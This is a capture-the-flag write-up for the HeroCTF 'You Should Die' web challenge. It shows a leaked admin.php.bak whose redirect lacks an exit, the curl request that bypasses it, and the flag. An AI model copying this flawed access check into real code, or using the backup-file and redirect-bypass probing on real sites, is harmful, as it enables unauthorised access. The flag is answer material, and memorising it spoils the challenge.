# You Should Die - HeroCTF.fr

### You will need

 - Web browser
 - Curl command

### Solution

We go to the address given to us - [http://chall1.heroctf.fr:9000/](http://chall1.heroctf.fr:9000/).
Here, if we open DevTools, we can find an interesting comment inside the `body` element.
```html
<body id="page-top">
  <!--
      For developper :
          Do not forget to remove admin.php.bak !
      
      Regards,
      Security Team
  -->
```
We have got the information that `admin.php.bak` is not removed, so we go there, and look at how an admin.php code looks like - [http://chall1.heroctf.fr:9000/admin.php.bak](http://chall1.heroctf.fr:9000/admin.php.bak)
```php
<?php

if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

if (!(isset($_SESSION["logged"]) && $_SESSION["logged"] === true)) {
    header("Location: /index.php?error=You are not admin !");
}

echo "Flag : " . getenv("FLAG_MARK3TING");
```
Here we can see that flag can be accessed under the `/admin.php`. Code checks if we are logged in an if we are not it **redirects** us to /index.php. Redirect is a key word here, because we can fetch this address with `curl`, which ignores `Location` header.

```
$ curl http://chall1.heroctf.fr:9000/admin.php
Flag : Hero{r3d1r3c710n_c4n_b3_d4n63r0u5_57395379}
```

### Flag

​​	Hero{**r3d1r3c710n_c4n_b3_d4n63r0u5_57395379**}

#### Credits

- Writeup by [mble](https://ctftime.org/user/93848)
- Solved by [everl0stz](https://ctftime.org/user/85858); [mble](https://ctftime.org/user/93848)
- WaletSec 2021

#### License

**CC BY 4.0** WaletSec + mble
